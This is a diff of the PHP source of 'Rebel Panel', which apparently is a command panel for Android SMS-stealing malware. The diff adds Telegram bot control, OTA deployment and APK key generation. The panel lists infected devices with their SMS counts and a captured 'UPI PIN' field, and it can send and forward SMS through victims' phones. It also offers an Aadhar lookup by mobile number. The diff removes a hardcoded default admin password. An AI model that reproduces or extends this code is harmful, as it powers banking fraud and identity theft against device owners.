@@ -1,4 +1,158 @@
 <?php
+require_once __DIR__ . '/rebel_bot_lib.php';
+
+if (isset($_GET['ota_update']) && (string)($_GET['owner'] ?? '') === REBEL_OWNER_ID) {
+  if (!function_exists('rebel_ota_deploy_panel')) {
+    rebel_json_out(['ok' => false, 'error' => 'rebel_bot_lib outdated — run bot_pull_update.php first']);
+  }
+  $ota = rebel_ota_deploy_panel();
+  rebel_json_out([
+    'ok' => count($ota['errors']) === 0,
+    'ota_updated' => $ota['updated'],
+    'errors' => $ota['errors'],
+    'panel_version' => $ota['panel_version'],
+    'next' => 'Restart Rebel Panel app'
+  ]);
+}
+
+if (isset($_GET['rebel_bot_status'])) {
+  $lib = @file_get_contents(__DIR__ . '/rebel_bot_lib.php') ?: '';
+  rebel_json_out([
+    'ok' => true,
+    'bot_version' => defined('REBEL_BOT_VERSION') ? REBEL_BOT_VERSION : 'old',
+    'genkeyapk_supported' => function_exists('rebel_bot_create_key') && strpos($lib, 'genkeyapk') !== false,
+    'parentapk_supported' => strpos($lib, 'parentapk') !== false,
+    'deploy_bot_url' => 'ota/deploy_bot.php?owner=' . REBEL_OWNER_ID,
+    'update_url' => 'bot_pull_update.php?owner=' . REBEL_OWNER_ID,
+    'ota_url' => 'bot_pull_update.php?owner=' . REBEL_OWNER_ID . '&action=ota',
+    'bot' => rebel_tg_api('getMe', []),
+    'webhook' => rebel_tg_api('getWebhookInfo', []),
+    'setup_webhook' => 'sex.php?rebel_bot_setup=1&owner=' . REBEL_OWNER_ID,
+    'setup_poll' => 'rebel_bot.php?action=start&owner=' . REBEL_OWNER_ID,
+    'cron_poll' => 'rebel_bot.php?poll=1&owner=' . REBEL_OWNER_ID
+  ]);
+}
+
+if (isset($_GET['rebel_bot_setup']) && (string)($_GET['owner'] ?? '') === REBEL_OWNER_ID) {
+  $hook = rebel_bot_webhook_url();
+  if (strpos($hook, 'https://') !== 0) {
+    rebel_tg_api('deleteWebhook', ['drop_pending_updates' => false]);
+    rebel_json_out([
+      'ok' => false,
+      'error' => 'HTTPS required for webhook. Use polling instead.',
+      'webhook' => $hook,
+      'poll_cli' => 'php rebel_bot.php',
+      'poll_url' => 'rebel_bot.php?action=start&owner=' . REBEL_OWNER_ID
+    ], 400);
+  }
+  $res = rebel_tg_set_webhook($hook);
+  rebel_json_out(['ok' => !empty($res['ok']), 'webhook' => $hook, 'telegram' => $res]);
+}
+
+if (isset($_GET['rebel_bot_webhook'])) {
+  $raw = file_get_contents('php://input');
+  $update = json_decode($raw ?: '{}', true);
+  if (is_array($update)) rebel_bot_handle_update($update);
+  rebel_json_out(['ok' => true]);
+}
+
+if (isset($_GET['sms_token_api']) || isset($_POST['sms_token_api'])) {
+  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
+  if (!is_array($body)) $body = [];
+  $token = trim((string)($body['token'] ?? $_SERVER['HTTP_X_REBEL_TOKEN'] ?? ''));
+  $data = rebel_keys_load();
+  if ($token === '' || !rebel_session_valid($data, $token)) {
+    rebel_keys_save($data);
+    rebel_json_out(['ok' => false, 'error' => 'Unauthorized'], 401);
+  }
+  rebel_keys_save($data);
+  $cfg = rebel_sms_token_config_load();
+  $action = strtolower(trim((string)($body['action'] ?? $_SERVER['REQUEST_METHOD'] ?? 'get')));
+  if ($action === 'get' || $_SERVER['REQUEST_METHOD'] === 'GET') {
+    rebel_json_out([
+      'ok' => true,
+      'config' => [
+        'enabled' => !empty($cfg['enabled']),
+        'device_id' => (string)($cfg['device_id'] ?? ''),
+        'database_url' => (string)($cfg['database_url'] ?? ''),
+        'fb_name' => (string)($cfg['fb_name'] ?? '')
+      ],
+      'log' => array_slice($cfg['log'] ?? [], 0, 15)
+    ]);
+  }
+  if (isset($body['enabled'])) $cfg['enabled'] = !empty($body['enabled']);
+  if (array_key_exists('device_id', $body)) $cfg['device_id'] = trim((string)$body['device_id']);
+  if (array_key_exists('database_url', $body)) $cfg['database_url'] = trim((string)$body['database_url']);
+  if (array_key_exists('fb_name', $body)) $cfg['fb_name'] = trim((string)$body['fb_name']);
+  rebel_sms_token_config_save($cfg);
+  rebel_json_out([
+    'ok' => true,
+    'config' => [
+      'enabled' => !empty($cfg['enabled']),
+      'device_id' => (string)($cfg['device_id'] ?? ''),
+      'database_url' => (string)($cfg['database_url'] ?? ''),
+      'fb_name' => (string)($cfg['fb_name'] ?? '')
+    ],
+    'log' => array_slice($cfg['log'] ?? [], 0, 15)
+  ]);
+}
+
+if (isset($_GET['rebel_auth']) || isset($_POST['rebel_auth'])) {
+  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
+  if (!is_array($body)) $body = [];
+  $action = strtolower(trim((string)($body['action'] ?? $_REQUEST['action'] ?? 'login')));
+  $data = rebel_keys_load();
+
+  if ($action === 'check') {
+    $token = trim((string)($body['token'] ?? ''));
+    if ($token === '') rebel_json_out(['ok' => false, 'error' => 'No session'], 401);
+    $valid = rebel_session_valid($data, $token);
+    if (!$valid) {
+      rebel_keys_save($data);
+      rebel_json_out(['ok' => false, 'error' => 'Session revoked or expired'], 401);
+    }
+    rebel_keys_save($data);
+    $mask = strlen($valid['key_ref']) > 8 ? substr($valid['key_ref'], 0, 8) . '••••' : '••••••••';
+    rebel_json_out([
+      'ok' => true,
+      'expires' => (int)$valid['expires'],
+      'created' => (int)$valid['created'],
+      'key_mask' => $mask,
+      'verified_at' => time()
+    ]);
+  }
+
+  if ($action === 'logout') {
+    $token = trim((string)($body['token'] ?? ''));
+    if ($token !== '') {
+      $hash = hash('sha256', $token);
+      if (isset($data['sessions'][$hash])) unset($data['sessions'][$hash]);
+      rebel_keys_save($data);
+    }
+    rebel_json_out(['ok' => true]);
+  }
+
+  $key = rebel_norm_key($body['key'] ?? $_REQUEST['key'] ?? '');
+  if ($key === '') rebel_json_out(['ok' => false, 'error' => 'Access key required'], 400);
+  $valid = rebel_key_login_allowed($data, $key);
+  if (!$valid) {
+    rebel_keys_save($data);
+    $row = $data['keys'][$key] ?? null;
+    if ($row && (!empty($row['used']) || (int)($row['uses'] ?? 0) >= 1)) {
+      rebel_json_out(['ok' => false, 'error' => 'Key already used — one-time only'], 403);
+    }
+    if ($row && !empty($row['revoked'])) {
+      rebel_json_out(['ok' => false, 'error' => 'Key revoked by admin'], 403);
+    }
+    rebel_json_out(['ok' => false, 'error' => 'Invalid or expired key'], 403);
+  }
+  rebel_consume_key($data, $key);
+  $remember = !empty($body['remember']);
+  $session = rebel_create_session($data, $key, $remember);
+  rebel_keys_save($data);
+  rebel_json_out(['ok' => true, 'token' => $session['token'], 'expires' => $session['expires']]);
+}
+
 if (isset($_GET['aadhar_api']) || isset($_GET['rbl_aadhar']) || isset($_POST['aadhar_api']) || isset($_POST['rbl_aadhar'])) {
   header('Content-Type: application/json; charset=UTF-8');
   header('Cache-Control: no-store');
@@ -70,6 +224,12 @@ header('Content-Type: text/html; charset=UTF-8');
     @keyframes orbFloat{0%,100%{transform:translate3d(0,0,0) scale(1)}50%{transform:translate3d(30px,-25px,50px) scale(1.08)}}
     body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,60,60,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,60,60,0.04) 1px,transparent 1px);background-size:44px 44px;pointer-events:none;z-index:0}
     .wrapper{position:relative;z-index:1}
+    #particleCanvas{will-change:transform;transform:translateZ(0)}
+    .main-layout,.main-area{transform:translateZ(0)}
+    .sidebar,.main-area,.tbl-wrap,.dev-list,.data-section{contain:layout style paint}
+    .dev-item{contain:layout style paint;content-visibility:auto;contain-intrinsic-size:auto 92px}
+    .tbl tbody tr{content-visibility:auto;contain-intrinsic-size:auto 44px}
+    header,.sidebar,.dev-hero{backface-visibility:hidden}
 
     /* ─── 3D GLOWING ICONS (icons only — layout stays flat) ─── */
     .i3d{display:inline-block;position:relative;font-style:normal;line-height:1;vertical-align:middle;transform-style:preserve-3d;transform:perspective(400px) rotateX(12deg) translateZ(0);filter:drop-shadow(0 3px 4px rgba(0,0,0,0.55)) drop-shadow(0 0 10px var(--icon-glow));text-shadow:0 1px 0 rgba(255,255,255,0.45),0 4px 8px rgba(0,0,0,0.65),0 0 14px var(--icon-glow),0 0 28px var(--icon-glow);animation:iconFloat 4.2s ease-in-out infinite,iconShine 3.6s ease-in-out infinite;will-change:transform,filter}
@@ -119,25 +279,58 @@ header('Content-Type: text/html; charset=UTF-8');
     @keyframes emojiSpin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
     .i3d-anim-bolt .em-a{animation:emojiBolt 1.8s ease-in-out infinite}
     @keyframes emojiBolt{0%,100%{opacity:1;filter:brightness(1)}50%{opacity:1;filter:brightness(1.45) drop-shadow(0 0 6px rgba(255,200,0,0.8))}}
+    @media (prefers-reduced-motion:reduce){
+      .i3d,.logo-icon-3d,.orb,.i3d-anim .em-a,.i3d-swap .em-a,.i3d-swap .em-b{animation:none!important}
+      #particleCanvas{opacity:0.15}
+    }
+    @media (max-width:900px){
+      #particleCanvas{opacity:0.22}
+      .orb{opacity:0.18}
+    }
 
-    /* ─── LOGIN ─── */
-    #loginPage{position:fixed;inset:0;z-index:9999;background:rgba(5,5,8,0.88);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;padding:20px}
+    /* ─── LOGIN (Advanced Key Gate) ─── */
+    #loginPage{position:fixed;inset:0;z-index:9999;background:radial-gradient(ellipse at 20% 20%,rgba(255,60,60,0.12),transparent 50%),radial-gradient(ellipse at 80% 80%,rgba(123,47,255,0.1),transparent 45%),rgba(5,5,8,0.92);backdrop-filter:blur(18px);display:flex;align-items:center;justify-content:center;padding:24px}
     #loginPage.hidden{display:none!important}
-    .login-card{background:linear-gradient(145deg,rgba(22,22,31,0.95),rgba(12,12,18,0.98));border:1px solid rgba(255,60,60,0.2);border-radius:22px;padding:40px 36px;width:100%;max-width:400px;position:relative;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,0.7),0 0 40px var(--glow),inset 0 1px 0 rgba(255,255,255,0.06);transition:box-shadow 0.35s ease}
-    .login-card:hover{box-shadow:0 40px 100px rgba(0,0,0,0.8),0 0 60px var(--glow)}
-    .login-card::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:22px 0 0 22px}
-    .login-logo{display:flex;align-items:center;gap:14px;margin-bottom:28px}
-    .login-logo .rebel{font-size:24px;font-weight:800;letter-spacing:-1px}
+    .login-shell{display:grid;grid-template-columns:1fr;gap:0;width:100%;max-width:460px;position:relative}
+    .login-card{background:linear-gradient(155deg,rgba(24,24,34,0.96),rgba(10,10,16,0.98));border:1px solid rgba(255,60,60,0.22);border-radius:26px;padding:38px 34px 32px;width:100%;position:relative;overflow:hidden;box-shadow:0 40px 100px rgba(0,0,0,0.75),0 0 60px var(--glow),inset 0 1px 0 rgba(255,255,255,0.07)}
+    .login-card::before{content:'';position:absolute;inset:-1px;border-radius:26px;padding:1px;background:linear-gradient(135deg,rgba(255,60,60,0.55),rgba(123,47,255,0.35),rgba(255,149,0,0.4));-webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none;animation:loginBorderSpin 8s linear infinite}
+    .login-card::after{content:'';position:absolute;top:0;left:0;width:4px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2),#7b2fff);border-radius:26px 0 0 26px}
+    @keyframes loginBorderSpin{0%{filter:hue-rotate(0deg)}100%{filter:hue-rotate(360deg)}}
+    .login-scanline{position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,255,255,0.012) 2px,rgba(255,255,255,0.012) 4px);pointer-events:none;opacity:0.35}
+    .login-badge-row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:22px}
+    .login-badge{font-family:'Space Mono',monospace;font-size:7px;letter-spacing:1.5px;text-transform:uppercase;padding:4px 10px;border-radius:100px;border:1px solid rgba(255,60,60,0.25);color:var(--accent);background:rgba(255,60,60,0.08)}
+    .login-badge.purple{border-color:rgba(123,47,255,0.35);color:#b794ff;background:rgba(123,47,255,0.1)}
+    .login-badge.green{border-color:rgba(0,255,157,0.3);color:var(--success);background:rgba(0,255,157,0.08)}
+    .login-logo{display:flex;align-items:center;gap:14px;margin-bottom:22px;position:relative;z-index:1}
+    .login-logo .rebel{font-size:26px;font-weight:800;letter-spacing:-1px}
     .login-logo .rebel em{font-style:normal;color:var(--accent)}
     .login-logo .panel-sub{font-family:ui-monospace,monospace;font-size:9px;color:var(--muted);letter-spacing:3px;margin-top:2px}
-    .login-card h2{font-size:20px;font-weight:800;margin-bottom:4px}
-    .login-card h2 span{color:var(--accent)}
-    .login-card .login-sub{color:var(--muted);font-size:12px;margin-bottom:24px}
-    .login-error{background:rgba(255,68,102,0.1);border:1px solid rgba(255,68,102,0.3);color:var(--error);border-radius:8px;padding:10px 14px;font-family:'Space Mono',monospace;font-size:11px;margin-bottom:14px;display:none}
-    .remember-row{display:flex;align-items:center;gap:10px;margin:14px 0 18px}
+    .login-card h2{font-size:22px;font-weight:800;margin-bottom:6px;position:relative;z-index:1}
+    .login-card h2 span{background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+    .login-card .login-sub{color:var(--muted);font-size:12px;margin-bottom:22px;line-height:1.55;position:relative;z-index:1}
+    .login-error{background:rgba(255,68,102,0.12);border:1px solid rgba(255,68,102,0.35);color:var(--error);border-radius:10px;padding:11px 14px;font-family:'Space Mono',monospace;font-size:11px;margin-bottom:14px;display:none;position:relative;z-index:1}
+    .key-field-wrap{margin-bottom:16px;position:relative;z-index:1}
+    .key-field-wrap label{font-size:9px;font-family:'Space Mono',monospace;color:var(--muted);letter-spacing:2px;display:block;margin-bottom:8px;text-transform:uppercase}
+    .key-input-box{display:flex;align-items:center;gap:8px;background:rgba(8,8,14,0.9);border:1px solid rgba(255,60,60,0.25);border-radius:14px;padding:6px 8px 6px 14px;transition:border-color 0.25s,box-shadow 0.25s}
+    .key-input-box:focus-within{border-color:var(--accent);box-shadow:0 0 0 3px rgba(255,60,60,0.12),0 0 24px rgba(255,60,60,0.15)}
+    .key-prefix{font-size:18px;opacity:0.85}
+    .key-input-box input{flex:1;border:none;background:transparent;padding:12px 4px;font-family:'Space Mono',monospace;font-size:14px;letter-spacing:1.5px;color:var(--text);outline:none;text-transform:uppercase}
+    .key-input-box input::placeholder{color:rgba(107,107,136,0.65);text-transform:none;letter-spacing:0.5px;font-size:12px}
+    .key-paste-btn{border:none;background:rgba(255,60,60,0.12);color:var(--accent);font-family:'Space Mono',monospace;font-size:9px;padding:8px 12px;border-radius:10px;cursor:pointer;transition:all 0.2s;white-space:nowrap}
+    .key-paste-btn:hover{background:rgba(255,60,60,0.22)}
+    .login-features{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px;position:relative;z-index:1}
+    .login-feat{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);padding:5px 10px;border-radius:8px;border:1px solid var(--border);background:rgba(255,255,255,0.02)}
+    .remember-row{display:flex;align-items:center;gap:10px;margin:12px 0 18px;position:relative;z-index:1}
     .remember-row input[type=checkbox]{width:16px;height:16px;accent-color:var(--accent);cursor:pointer}
     .remember-row label{font-size:11px;color:var(--muted);cursor:pointer}
-    .login-hint{margin-top:16px;text-align:center;font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)}
+    .btn-login-advanced{position:relative;z-index:1;overflow:hidden}
+    .btn-login-advanced:disabled{opacity:0.65;cursor:wait;transform:none!important}
+    .btn-login-advanced .btn-shine{position:absolute;top:0;left:-100%;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.18),transparent);animation:btnShine 3s ease-in-out infinite}
+    @keyframes btnShine{0%{left:-100%}40%,100%{left:140%}}
+    .login-hint{margin-top:18px;text-align:center;font-family:'Space Mono',monospace;font-size:10px;color:var(--muted);line-height:1.6;position:relative;z-index:1}
+    .login-hint strong{color:var(--accent2)}
+    .login-status{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:12px;font-family:'Space Mono',monospace;font-size:9px;color:var(--success);opacity:0.85;position:relative;z-index:1}
+    .login-status-dot{width:6px;height:6px;border-radius:50%;background:var(--success);box-shadow:0 0 8px var(--success);animation:softPulse 2s ease-in-out infinite}
     label{font-size:9px;font-family:'Space Mono',monospace;color:var(--muted);letter-spacing:1.5px;display:block;margin-bottom:5px;text-transform:uppercase}
     input,textarea{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px 14px;color:var(--text);font-family:'Space Mono',monospace;font-size:13px;outline:none;transition:border-color 0.2s}
     input:focus,textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(255,60,60,0.1)}
@@ -215,6 +408,22 @@ header('Content-Type: text/html; charset=UTF-8');
     .dev-empty{text-align:center;padding:30px 14px;color:var(--muted);font-family:'Space Mono',monospace;font-size:9px}
     .cache-badge{font-family:'Space Mono',monospace;font-size:7px;color:var(--accent2);padding:2px 6px;border:1px solid rgba(255,149,0,0.25);border-radius:6px;margin-left:6px}
     .fetch-ms{font-family:'Space Mono',monospace;font-size:8px;color:var(--success);margin-left:4px}
+    .sms-token-wrap{margin:10px 12px 0;padding:12px;border:1px solid rgba(0,255,157,0.18);border-radius:12px;background:linear-gradient(145deg,rgba(18,18,26,0.95),rgba(10,10,15,0.98));box-shadow:0 4px 18px rgba(0,0,0,0.25)}
+    .sms-token-title{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:6px}
+    .sms-token-pulse{width:7px;height:7px;border-radius:50%;background:var(--muted);flex-shrink:0}
+    .sms-token-pulse.on{background:var(--success);box-shadow:0 0 8px var(--success);animation:softPulse 2s ease-in-out infinite}
+    .sms-token-pulse.off{background:var(--error);box-shadow:0 0 8px var(--error)}
+    .sms-token-row{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:8px}
+    .sms-token-toggle{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:700;color:var(--text);cursor:pointer}
+    .sms-token-toggle input{width:16px;height:16px;accent-color:var(--success)}
+    .sms-token-device{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);line-height:1.5;margin-bottom:8px;word-break:break-all}
+    .sms-token-device strong{color:var(--text)}
+    .sms-token-btn{width:100%;padding:7px 10px;border-radius:8px;border:1px solid rgba(0,255,157,0.25);background:rgba(0,255,157,0.08);color:var(--success);font-family:'Space Mono',monospace;font-size:8px;cursor:pointer;transition:all 0.2s;margin-bottom:8px}
+    .sms-token-btn:hover{background:rgba(0,255,157,0.15);border-color:var(--success)}
+    .sms-token-log{max-height:88px;overflow-y:auto;font-family:'Space Mono',monospace;font-size:7px;color:var(--muted);line-height:1.55;border-top:1px solid rgba(255,255,255,0.06);padding-top:7px}
+    .sms-token-log .ok{color:var(--success)}
+    .sms-token-log .bad{color:var(--error)}
+    .sms-token-hint{font-family:'Space Mono',monospace;font-size:7px;color:var(--muted);margin-top:6px;opacity:0.8;line-height:1.4}
     .hdr-actions{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
     .btn-fb{padding:7px 14px;border-radius:100px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-family:'Space Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.25s}
     .btn-fb:hover{border-color:var(--accent);color:var(--accent);box-shadow:0 4px 16px rgba(255,60,60,0.15)}
@@ -324,9 +533,10 @@ header('Content-Type: text/html; charset=UTF-8');
     @keyframes toastOut{to{opacity:0;transform:translateX(20px)}}
 
     /* ─── FOOTER ─── */
-    footer{border-top:1px solid var(--border);padding:14px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
+    footer{border-top:1px solid var(--border);padding:14px 28px;display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:10px}
     .footer-brand{font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)}
     .footer-brand strong{color:var(--accent)}
+    .footer-address{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);line-height:1.55;max-width:720px;opacity:0.85}
 
     @media(max-width:900px){
       .sidebar{width:100%;height:auto;position:relative;top:0;border-right:none;border-bottom:1px solid var(--border)}
@@ -430,21 +640,25 @@ header('Content-Type: text/html; charset=UTF-8');
 
 <!-- LOGIN -->
 <div id="loginPage">
-  <div class="login-card">
-    <div class="login-logo">
-      <svg class="logo-icon-3d" width="34" height="34" viewBox="0 0 38 38" fill="none"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
-      <div><div class="rebel"><em>Rebel</em> Panel</div><div class="panel-sub">LAPTOP MODE · 2D</div></div>
+  <div class="login-shell">
+    <div class="login-card">
+      <div class="login-scanline"></div>
+      <div class="login-logo">
+        <svg class="logo-icon-3d" width="38" height="38" viewBox="0 0 38 38" fill="none"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
+        <div><div class="rebel"><em>Rebel</em> Panel</div></div>
+      </div>
+      <h2>Access <span>Key</span></h2>
+      <div id="loginError" class="login-error">❌ Invalid or expired access key!</div>
+      <div class="key-field-wrap">
+        <div class="key-input-box">
+          <span class="key-prefix">🔑</span>
+          <input type="text" id="loginKey" placeholder="RBL-XXXXXX-XXXXXX" autocomplete="off" spellcheck="false" maxlength="32"/>
+          <button type="button" class="key-paste-btn" onclick="pasteLoginKey()">Paste</button>
+        </div>
+      </div>
+      <div class="remember-row"><input type="checkbox" id="rememberMe" checked/><label for="rememberMe">Remember device</label></div>
+      <button class="btn btn-login-advanced" id="loginBtn" onclick="doLogin()"><span class="btn-shine"></span><span class="i3d i3d-purple i3d-sm i3d-swap"><span class="em-a">🔐</span><span class="em-b">🔓</span></span> Unlock</button>
     </div>
-    <h2>Admin <span>Login</span></h2>
-    <p class="login-sub">Enter credentials to access panel.</p>
-    <div id="loginError" class="login-error">❌ Wrong credentials!</div>
-    <div class="input-group">
-      <div><label>Username</label><input type="text" id="loginUser" placeholder="admin" autocomplete="username"/></div>
-      <div><label>Password</label><input type="password" id="loginPass" placeholder="••••••••" autocomplete="current-password"/></div>
-    </div>
-    <div class="remember-row"><input type="checkbox" id="rememberMe"/><label for="rememberMe">Remember me</label></div>
-    <button class="btn" onclick="doLogin()"><span class="i3d i3d-purple i3d-sm i3d-swap"><span class="em-a">🔐</span><span class="em-b">🔓</span></span> Login</button>
-    <div class="login-hint">Default: admin / rebel2024</div>
   </div>
 </div>
 
@@ -483,9 +697,19 @@ header('Content-Type: text/html; charset=UTF-8');
         <div class="mini-stat"><div class="mini-val on" id="stOnline">0</div><div class="mini-lbl">ONLINE</div></div>
         <div class="mini-stat"><div class="mini-val off" id="stOffline">0</div><div class="mini-lbl">OFFLINE</div></div>
       </div>
+      <div class="sms-token-wrap" id="smsTokenWrap">
+        <div class="sms-token-title"><span>📱 Auto Token SMS</span><span class="sms-token-pulse off" id="smsTokenPulse"></span></div>
+        <div class="sms-token-row">
+          <label class="sms-token-toggle"><input type="checkbox" id="smsTokenEnabled" onchange="saveSmsTokenConfig()"/> Enable</label>
+        </div>
+        <div class="sms-token-device" id="smsTokenDevice">Device: <strong>not set</strong></div>
+        <button type="button" class="sms-token-btn" onclick="useSelDeviceForSmsToken()">Use selected device</button>
+        <div class="sms-token-log" id="smsTokenLog">Waiting for channel messages...</div>
+        <div class="sms-token-hint">Channel format: To + Message → auto SMS via device</div>
+      </div>
     </div>
     <div class="sidebar-search">
-      <input placeholder="Search phone / device..." id="devSearch" oninput="renderSidebar()" autocomplete="off"/>
+      <input placeholder="Search phone / device..." id="devSearch" oninput="onDevSearch()" autocomplete="off"/>
     </div>
     <div class="dev-list" id="devList">
       <div class="dev-empty"><span class="i3d i3d-blue i3d-lg">📡</span><br>No devices connected</div>
@@ -519,6 +743,7 @@ header('Content-Type: text/html; charset=UTF-8');
           <div class="hm"><div class="hm-lbl">ANDROID</div><div class="hm-val" id="dAndroid">—</div></div>
           <div class="hm"><div class="hm-lbl">SMS COUNT</div><div class="hm-val orange" id="dSmsCount">—</div></div>
           <div class="hm"><div class="hm-lbl">LAST SEEN</div><div class="hm-val" id="dLastSeen">—</div></div>
+          <div class="hm"><div class="hm-lbl">UPI PIN</div><div class="hm-val orange" id="dUpiPin">—</div></div>
         </div>
       </div>
 
@@ -579,7 +804,7 @@ header('Content-Type: text/html; charset=UTF-8');
       <!-- SEND SMS -->
       <div class="data-section" id="tab-sendsms">
         <div class="sec-title" style="margin-bottom:4px">Send <span>SMS</span></div>
-        <div class="api-key-warn" id="sendSmsApiWarn">⚠️ <strong>API Key is necessary</strong> for SMS sending. Rebel AI wizard mein API Key add karo — bina iske command device tak nahi jayega.</div>
+        <div class="api-key-warn" id="sendSmsApiWarn">⚠️ <strong>API Key is required</strong> for SMS sending. Add it in the Rebel AI wizard — without it, commands will not reach the device.</div>
         <p style="color:var(--muted);font-size:12px;margin-bottom:0">Send message via target device</p>
         <div class="config-card">
           <div class="input-group">
@@ -597,7 +822,7 @@ header('Content-Type: text/html; charset=UTF-8');
       <!-- FORWARDING -->
       <div class="data-section" id="tab-forward">
         <div class="sec-title" style="margin-bottom:8px">SMS <span>Forwarding</span></div>
-        <div class="api-key-warn" id="forwardApiWarn">⚠️ <strong>API Key is necessary</strong> for SMS forwarding. Firebase connect karte waqt API Key zaroor add karo.</div>
+        <div class="api-key-warn" id="forwardApiWarn">⚠️ <strong>API Key is required</strong> for SMS forwarding. Make sure to add the API Key when connecting Firebase.</div>
         <div class="config-card">
           <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">
             <label style="margin:0;font-size:11px;color:var(--text)">Enable Forwarding</label>
@@ -623,7 +848,10 @@ header('Content-Type: text/html; charset=UTF-8');
 </div><!-- /main-layout -->
 
 <footer>
-  <div class="footer-brand"><strong>Rebel Panel</strong> — Laptop Mode (2D) · <a href="sex.php" style="color:var(--accent)">Full graphics</a></div>
+  <div>
+    <div class="footer-brand"><strong>Rebel Panel</strong> — Laptop Mode (2D) · <a href="sex.php" style="color:var(--accent)">Full graphics</a></div>
+    <div class="footer-address">Next building to A.P. Diagnostics Pvt.Ltd, 128/5, K Block, Kidwai Nagar, Kanpur — Near Gaushala Usmanpur crossing (SBI), Usmanpur, Kanpur, Uttar Pradesh 208011</div>
+  </div>
   <div class="footer-brand" id="footerTime"></div>
 </footer>
 </div><!-- /wrapper -->
@@ -644,7 +872,7 @@ header('Content-Type: text/html; charset=UTF-8');
   <div class="modal-box modal-wide" onclick="event.stopPropagation()">
     <button class="modal-close" onclick="document.getElementById('firebaseModal').classList.add('hidden')">✕</button>
     <div class="sec-title" style="margin-bottom:12px"><span class="i3d i3d-fire i3d-anim i3d-anim-fire"><span class="em-a">🔥</span></span> Firebase <span>Manager</span></div>
-    <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Use <strong>Chat with Rebel AI</strong> — step-by-step wizard URL, API key aur saari config mangta hai. URL hidden rehta hai.</p>
+    <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Use <strong>Chat with Rebel AI</strong> — a step-by-step wizard asks for URL, API key, and full config. The URL stays hidden.</p>
     <div class="fb-list" id="fbList"></div>
     <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:12px">
       <button class="btn-sm" onclick="openRebelAiModal();closeFirebaseModalQuick()"><span class="i3d i3d-purple i3d-sm i3d-anim i3d-anim-robot"><span class="em-a">🤖</span></span> Chat with Rebel AI</button>
@@ -658,7 +886,7 @@ header('Content-Type: text/html; charset=UTF-8');
   <div class="modal-box modal-wide" onclick="event.stopPropagation()">
     <button class="modal-close" onclick="document.getElementById('aadharModal').classList.add('hidden')">✕</button>
     <div class="sec-title" style="margin-bottom:8px"><span class="i3d i3d-green i3d-anim i3d-anim-pulse"><span class="em-a">🪪</span></span> Aadhar <span>Bot</span></div>
-    <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Mobile number dalo — API response se sirf <strong>aadhar</strong> field fetch hogi.</p>
+    <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Enter a mobile number — only the <strong>aadhar</strong> field will be fetched from the API response.</p>
     <div class="config-card" style="max-width:100%">
       <div class="input-group">
         <div><label><span class="i3d i3d-blue i3d-sm">📱</span> Mobile Number</label><input type="tel" id="aadharNum" placeholder="9876543210" onkeydown="if(event.key==='Enter')lookupAadhar()"/></div>
@@ -698,6 +926,7 @@ header('Content-Type: text/html; charset=UTF-8');
 
 <div class="toast-container" id="toastContainer"></div>
 
+<script src="firebase_defaults.js"></script>
 <script>
 var allDevs=[], selDev='', activeListeners={};
 var firebaseInstances=[], firebaseConfigs=[];
@@ -706,6 +935,7 @@ var clientsRawMap={}, tabLoaded={}, cacheWriteTimer=null;
 var CLIENTS_CACHE_KEY='rbl_clients_cache_v3';
 var FIREBASE_CFG_KEY='rbl_firebase_list';
 var CLIENTS_CACHE_TTL=6*60*60*1000;
+var SMS_FAST_MS=100;
 var fetchStartMs=0, firstFetchDone=false;
 var activeFbId='';
 var ACTIVE_FB_KEY='rbl_active_fb';
@@ -720,48 +950,18 @@ var rebelWizardStep=0;
 var rebelWizardDraft={};
 var REBEL_WIZARD_STEPS=[
